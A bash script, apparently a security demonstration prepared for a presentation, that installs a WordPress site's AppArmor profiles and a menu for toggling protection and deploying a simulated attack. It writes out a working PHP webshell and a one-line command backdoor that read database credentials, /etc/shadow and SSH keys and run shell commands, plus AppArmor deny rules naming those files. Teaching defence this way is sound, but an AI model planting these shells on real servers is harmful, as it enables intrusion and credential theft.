#!/bin/bash

# WordPress Security Attack & Defense Demonstration
# Created by: Github Copilot for LESdylan
# Date: 2025-04-10

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${YELLOW}============================================================${NC}"
echo -e "${YELLOW}     WordPress Security Attack & Defense Demonstration      ${NC}"
echo -e "${YELLOW}============================================================${NC}"

# Check if running as root
if [ "$(id -u)" -ne 0 ]; then
    echo -e "${RED}This script must be run as root. Please use sudo.${NC}"
    exit 1
fi

# Create directory for demo artifacts
mkdir -p /root/wordpress-security-demo

# Step 1: Backup current AppArmor status
echo -e "\n${YELLOW}Step 1: Backing up current AppArmor status...${NC}"
aa-status >/root/wordpress-security-demo/apparmor-status-before.txt
echo -e "✅ AppArmor status backed up"

# Step 2: Create "malicious" upload file (simulated webshell)
echo -e "\n${YELLOW}Step 2: Creating simulated malicious files...${NC}"
cat >/tmp/malicious-webshell.php <<'EOF'
<?php
// This file simulates a malicious webshell that might be uploaded to WordPress
// It attempts various malicious actions that AppArmor should block

echo "<html><head><title>WordPress Hack Demonstration</title>";
echo "<style>body{font-family:Arial;margin:40px}h1{color:#d63031}pre{background:#f5f5f5;padding:10px}
.success{color:green}.failure{color:red}</style></head><body>";

echo "<h1>⚠️ WordPress Hack Demonstration</h1>";
echo "<p>This simulates a webshell that an attacker might upload to your WordPress site.</p>";

// Get system information
echo "<h2>🔍 System Information:</h2>";
echo "<pre>";
echo "Server: " . $_SERVER['SERVER_SOFTWARE'] . "\n";
echo "PHP version: " . phpversion() . "\n";
echo "User running as: "; system('whoami');
echo "Current directory: " . getcwd() . "\n";
echo "</pre>";

// Try to access WordPress configuration
echo "<h2>🔑 WordPress Configuration:</h2>";
echo "<pre>";
if (file_exists('../wp-config.php')) {
    $config = file_get_contents('../wp-config.php');
    // Extract database credentials
    preg_match("/define\(\s*'DB_NAME',\s*'(.+?)'\s*\);/", $config, $matches);
    echo "DB Name: " . (isset($matches[1]) ? $matches[1] : "Not found") . "\n";
    preg_match("/define\(\s*'DB_USER',\s*'(.+?)'\s*\);/", $config, $matches);
    echo "DB User: " . (isset($matches[1]) ? $matches[1] : "Not found") . "\n";
    preg_match("/define\(\s*'DB_PASSWORD',\s*'(.+?)'\s*\);/", $config, $matches);
    echo "DB Pass: " . (isset($matches[1]) ? $matches[1] : "Not found") . "\n";
} else {
    echo "wp-config.php not found\n";
}
echo "</pre>";

// Try to write backdoor files
echo "<h2>⚠️ Backdoor Installation:</h2>";
$backdoor_content = '<?php if(isset($_REQUEST["cmd"])){ system($_REQUEST["cmd"]); } ?>';
$locations = [
    '/var/www/html/backdoor.php',
    '/var/www/html/wp-content/backdoor.php', 
    '/var/www/html/wp-content/uploads/backdoor.php',
    '/tmp/backdoor.php', 
    '/etc/backdoor.php'
];

foreach ($locations as $location) {
    $success = @file_put_contents($location, $backdoor_content);
    echo "<p>Creating backdoor at <code>$location</code>: ";
    if ($success) {
        echo "<span class='failure'>SUCCESS - VULNERABLE!</span>";
    } else {
        echo "<span class='success'>FAILED - PROTECTED!</span>";
    }
    echo "</p>";
}

// Try to access system files
echo "<h2>🔍 System File Access:</h2>";
$system_files = [
    '/etc/passwd' => 'User accounts',
    '/etc/shadow' => 'Password hashes',
    '/root/.ssh/id_rsa' => 'SSH private key',
    '/var/www/html/wp-config.php' => 'WordPress config'
];

foreach ($system_files as $file => $description) {
    $content = @file_get_contents($file);
    echo "<p>Reading <code>$file</code> ($description): ";
    if ($content) {
        echo "<span class='failure'>SUCCESS - VULNERABLE!</span><br>";
        echo "<pre>" . htmlspecialchars(substr($content, 0, 200)) . "...</pre>";
    } else {
        echo "<span class='success'>FAILED - PROTECTED!</span>";
    }
    echo "</p>";
}

// Try to execute system commands
echo "<h2>⚡ Command Execution:</h2>";
$commands = [
    'id' => 'User identity',
    'uname -a' => 'System information',
    'ls -la /root' => 'Root directory',
    'cat /etc/passwd | grep -v "nologin" | grep -v "false"' => 'Shell users'
];

foreach ($commands as $cmd => $description) {
    echo "<p>Running command <code>$cmd</code> ($description):<br>";
    echo "<pre>";
    $output = [];
    exec($cmd, $output, $return_value);
    if (!empty($output)) {
        echo "<span class='failure'>COMMAND EXECUTED - VULNERABLE!</span>\n\n";
        echo htmlspecialchars(implode("\n", $output));
    } else {
        echo "<span class='success'>COMMAND BLOCKED - PROTECTED!</span>";
    }
    echo "</pre></p>";
}

echo "</body></html>";
?>
EOF

# Create a PHP backdoor simulation
cat >/tmp/simple-backdoor.php <<'EOF'
<?php
// Simulated backdoor that would normally be hidden
if(isset($_REQUEST["cmd"])){
    system($_REQUEST["cmd"]);
}
echo "Nothing to see here...";
?>
EOF

echo -e "✅ Malicious files created"

# Step 3: Create utility to enable/disable AppArmor
cat >/root/wordpress-security-demo/toggle-protection.sh <<'EOF'
#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

if [ "$1" == "off" ]; then
    echo -e "${RED}⚠️ DISABLING SECURITY - WordPress is now VULNERABLE${NC}"
    aa-disable usr.sbin.php-fpm8.2 2>/dev/null || true
    aa-disable usr.sbin.lighttpd 2>/dev/null || true
    
    apparmor_parser -R /etc/apparmor.d/usr.sbin.php-fpm8.2 2>/dev/null || true
    apparmor_parser -R /etc/apparmor.d/usr.sbin.lighttpd 2>/dev/null || true
    
    systemctl restart php8.2-fpm lighttpd
    echo -e "${RED}Security protection disabled. The system is now vulnerable to attacks.${NC}"
    
elif [ "$1" == "on" ]; then
    echo -e "${GREEN}🔐 ENABLING SECURITY - Activating AppArmor Protection${NC}"
    
    # Load profiles in enforce mode
    aa-enforce /etc/apparmor.d/usr.sbin.php-fpm8.2
    aa-enforce /etc/apparmor.d/usr.sbin.lighttpd
    
    systemctl restart php8.2-fpm lighttpd
    echo -e "${GREEN}Security protection enabled. AppArmor is now protecting WordPress.${NC}"
    
else
    echo "Usage: $0 [on|off]"
    echo "  on  - Enable AppArmor protection"
    echo "  off - Disable AppArmor protection"
fi

echo -e "\n${YELLOW}Current AppArmor Status:${NC}"
aa-status | grep -E "php-fpm|lighttpd"
EOF

chmod +x /root/wordpress-security-demo/toggle-protection.sh

# Step 4: Create main demonstration script
cat >/root/wordpress-security-demo/run-attack-demo.sh <<'EOF'
#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}============================================================${NC}"
echo -e "${BLUE}     WordPress Security Attack & Defense Demonstration      ${NC}"
echo -e "${BLUE}============================================================${NC}"

# Function to show attack status
check_backdoor() {
    echo -e "\n${YELLOW}Checking backdoor installations...${NC}"
    for location in "/var/www/html/backdoor.php" "/var/www/html/wp-content/backdoor.php" "/etc/backdoor.php" "/tmp/backdoor.php"; do
        if [ -f "$location" ]; then
            echo -e "${RED}⚠️ BACKDOOR FOUND: $location${NC}"
            echo -e "   Content: $(head -n 1 $location)"
        else
            echo -e "${GREEN}✅ No backdoor at: $location${NC}"
        fi
    done
}

# Function to clean up backdoors
cleanup_backdoors() {
    echo -e "\n${YELLOW}Cleaning up backdoors...${NC}"
    rm -f /var/www/html/backdoor.php
    rm -f /var/www/html/wp-content/backdoor.php
    rm -f /var/www/html/wp-content/uploads/backdoor.php
    rm -f /etc/backdoor.php
    rm -f /tmp/backdoor.php
    echo -e "${GREEN}✅ All backdoors removed${NC}"
}

# Function to deploy the malicious file
deploy_malicious_file() {
    echo -e "\n${YELLOW}Deploying malicious webshell to WordPress...${NC}"
    cp /tmp/malicious-webshell.php /var/www/html/wp-content/uploads/
    chmod 644 /var/www/html/wp-content/uploads/malicious-webshell.php
    chown www-data:www-data /var/www/html/wp-content/uploads/malicious-webshell.php
    echo -e "${RED}⚠️ Malicious webshell deployed at: http://YOUR_SERVER_IP/wp-content/uploads/malicious-webshell.php${NC}"
}

# Function to remove the malicious file
remove_malicious_file() {
    echo -e "\n${YELLOW}Removing malicious webshell...${NC}"
    rm -f /var/www/html/wp-content/uploads/malicious-webshell.php
    echo -e "${GREEN}✅ Malicious webshell removed${NC}"
}

# Main menu
show_menu() {
    echo -e "\n${BLUE}===== WordPress Security Demonstration Menu =====${NC}"
    echo -e "1. ${RED}Turn OFF protection${NC} (disable AppArmor)"
    echo -e "2. ${RED}Deploy malicious file${NC} (simulate upload exploit)"
    echo -e "3. ${YELLOW}CHECK security status${NC} (look for backdoors)"
    echo -e "4. ${GREEN}Turn ON protection${NC} (enable AppArmor)"
    echo -e "5. ${GREEN}Clean up${NC} (remove all malicious files)"
    echo -e "6. Show demonstration steps"
    echo -e "0. Exit"
    echo
    echo -ne "${YELLOW}Select an option: ${NC}"
    read option
    
    case $option in
        1) /root/wordpress-security-demo/toggle-protection.sh off ;;
        2) deploy_malicious_file ;;
        3) check_backdoor ;;
        4) /root/wordpress-security-demo/toggle-protection.sh on ;;
        5) 
           cleanup_backdoors
           remove_malicious_file
           ;;
        6) show_demo_steps ;;
        0) exit 0 ;;
        *) echo -e "${RED}Invalid option${NC}" ;;
    esac
    
    echo -e "\nPress Enter to continue..."
    read
    show_menu
}

show_demo_steps() {
    echo -e "\n${BLUE}===== Demonstration Steps for Your Defense =====${NC}"
    echo -e "1. ${YELLOW}First, turn OFF protection${NC} (option 1)"
    echo -e "2. ${YELLOW}Deploy the malicious file${NC} (option 2)"
    echo -e "3. ${YELLOW}Visit the URL it shows in your browser${NC}"
    echo -e "   - Show how a vulnerable WordPress can be exploited"
    echo -e "   - Point out the backdoors being created"
    echo -e "   - Show sensitive files being accessed"
    echo -e "4. ${YELLOW}Check security status${NC} (option 3)"
    echo -e "   - Show that backdoors were successfully created"
    echo -e "5. ${YELLOW}Clean up${NC} (option 5)"
    echo -e "6. ${YELLOW}Turn ON protection${NC} (option 4)"
    echo -e "7. ${YELLOW}Deploy the malicious file AGAIN${NC} (option 2)"
    echo -e "8. ${YELLOW}Visit the URL again in your browser${NC}"
    echo -e "   - Show how AppArmor blocks the same attacks"
    echo -e "   - Point out which operations are now blocked"
    echo -e "9. ${YELLOW}Check security status${NC} (option 3)"
    echo -e "   - Show that no backdoors were created"
    echo -e "10. ${YELLOW}Examine AppArmor logs${NC}"
    echo -e "    - Run: sudo dmesg | grep -i apparmor | tail -20"
    echo -e "    - Show how AppArmor blocked the malicious actions"
}

# Show menu
show_menu
EOF

chmod +x /root/wordpress-security-demo/run-attack-demo.sh

# Step 5: Create WordPress directories if they don't exist
echo -e "\n${YELLOW}Step 5: Setting up WordPress directories...${NC}"
mkdir -p /var/www/html/wp-content/uploads
chown -R www-data:www-data /var/www/html

# Step 6: Set up better AppArmor profiles
echo -e "\n${YELLOW}Step 6: Creating improved AppArmor profiles...${NC}"
cat >/etc/apparmor.d/usr.sbin.php-fpm8.2 <<'EOF'
#include <tunables/global>

profile php-fpm8.2 /usr/sbin/php-fpm8.2 flags=(attach_disconnected) {
  #include <abstractions/base>
  #include <abstractions/nameservice>
  
  capability setgid,
  capability setuid,
  capability dac_override,
  
  # PHP-FPM binary and configs
  /usr/sbin/php-fpm8.2 rmix,
  /etc/php/** r,
  
  # Runtime files
  /run/php/** rwk,
  /run/php/php8.2-fpm.pid rwk,
  /run/php/php8.2-fpm.sock rwk,
  
  # Log files
  /var/log/php8.2-fpm.log rw,
  /var/log/php/** rw,
  
  # Web directories - allow read for all files
  /var/www/html/ r,
  /var/www/html/** r,
  
  # Web directories - allow write only to specific areas
  /var/www/html/wp-content/uploads/** rw,
  /var/www/html/wp-content/upgrade/** rw,
  /var/www/html/wp-content/plugins/** rw,
  /var/www/html/wp-content/themes/** rw,
  /var/www/html/wp-content/*.php rw,
  
  # Temp files
  /tmp/** rwk,
  
  # Libraries
  /usr/lib{,32,64}/** rm,
  /lib{,32,64}/** rm,
  
  # EXPLICITLY DENY these sensitive areas
  deny /etc/** w,
  deny /etc/shadow r,
  deny /root/** rwklmx,
  deny /home/** rwklmx,
  
  # Allow PHP to read itself
  /usr/bin/php* rix,
  
  # Device access
  /dev/urandom r,
  /dev/null rw,
}
EOF

cat >/etc/apparmor.d/usr.sbin.lighttpd <<'EOF'
#include <tunables/global>

profile lighttpd /usr/sbin/lighttpd flags=(attach_disconnected) {
  #include <abstractions/base>
  #include <abstractions/nameservice>
  
  capability setgid,
  capability setuid,
  capability net_bind_service,
  capability dac_override,
  
  # Lighttpd binary
  /usr/sbin/lighttpd rmix,
  
  # Config files
  /etc/lighttpd/** r,
  
  # Web content
  /var/www/html/ r,
  /var/www/html/** r,
  
  # Log files
  /var/log/lighttpd/** rw,
  
  # Runtime files
  /run/lighttpd.pid rw,
  /var/run/lighttpd.pid rw,
  
  # Access PHP socket
  /run/php/php8.2-fpm.sock rw,
  
  # Upload directory
  /var/cache/lighttpd/** rwk,
  
  # EXPLICITLY DENY these sensitive areas
  deny /etc/** w,
  deny /etc/shadow r,
  deny /root/** rwklmx,
  
  # Libraries
  /usr/lib{,32,64}/** rm,
  /lib{,32,64}/** rm,
  
  # Device access
  /dev/urandom r,
  /dev/null rw,
}
EOF

echo -e "✅ AppArmor profiles created"

# Step 7: Set Everything Up in Complain Mode First
echo -e "\n${YELLOW}Step 7: Loading AppArmor profiles in complain mode...${NC}"
aa-complain /etc/apparmor.d/usr.sbin.php-fpm8.2
aa-complain /etc/apparmor.d/usr.sbin.lighttpd

echo -e "\n${YELLOW}Step 8: Restarting services...${NC}"
systemctl restart php8.2-fpm
systemctl restart lighttpd

# Step 9: Final Instructions
echo -e "\n${GREEN}============================================================${NC}"
echo -e "${GREEN}     WordPress Attack & Defense Demo Ready!     ${NC}"
echo -e "${GREEN}============================================================${NC}"
echo -e "\nTo run the demonstration, use:"
echo -e "   ${YELLOW}sudo /root/wordpress-security-demo/run-attack-demo.sh${NC}"
echo -e "\nThe demo will walk you through:"
echo -e "1. Disabling protection"
echo -e "2. Showing a simulated WordPress attack"
echo -e "3. Enabling AppArmor protection"
echo -e "4. Demonstrating how the same attack is now blocked"
echo -e "\nThis is perfect for your defense presentation!"
echo -e "${GREEN}============================================================${NC}"
